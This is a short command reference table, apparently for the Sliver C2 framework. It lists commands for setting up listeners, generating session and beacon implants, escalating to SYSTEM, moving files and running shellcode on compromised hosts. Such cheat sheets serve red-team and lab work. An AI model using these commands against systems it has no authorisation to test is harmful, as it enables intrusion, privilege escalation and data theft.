| **Command** | **Description** |
| --------------|-------------------|
| `help`| Displays the commands and their descriptions|
| `http -L <Local IP> -l <Port>` | Set up HTTP listener |
| `profiles new --http <Local IP>:<Port> --format shellcode <Profile Name>` | Create a new C2 pofile |
| `stage-listener --url tcp://<Localhost:Port> --profile <Profile name>` | Set up Stager lstener |
| `generate --http <Local IP>:<Port> --os <OS>`| Generates a session implant|
|`generate beacon --http <Local IP>:<Port> --os <OS>`| Generates a beacon implant|
|`sessions`| Lists active/inactive sessions|
|`sessions -K`|Removes all sessions available or not|
|`sessions prune`|Removes unavailable sessions|
|`sessions -k -i <session>`|Removes the specified session|
|`beacons` | Lists active/inactive beacons|
|`tasks`| Lists the pending or completed tasks ran by the operator|
|`getsystem`| Attempts to get a session as `NT AUTHORITY\SYSTEM`|
|`interactive`| Tasks the beacon to spawn a session that becomes interactive|
|`cd`|Change directory|
|`ls`|Lists the contents of the directory|
|`download <file/directory>`| Downloads a file/directory|
|`upload`|Uploads a file|
|`execute-assembly`|Executes a .NET assembly in a child process|
|`execute-shellcode`|Executes the specified shellcode in process|
|`multiplayer`|Enables multiplayer mode on the server|
|`armory install <alias/extension>`|Installs the given alias/extension|
|`armory install all`|Installs all of the available aliases/extensions|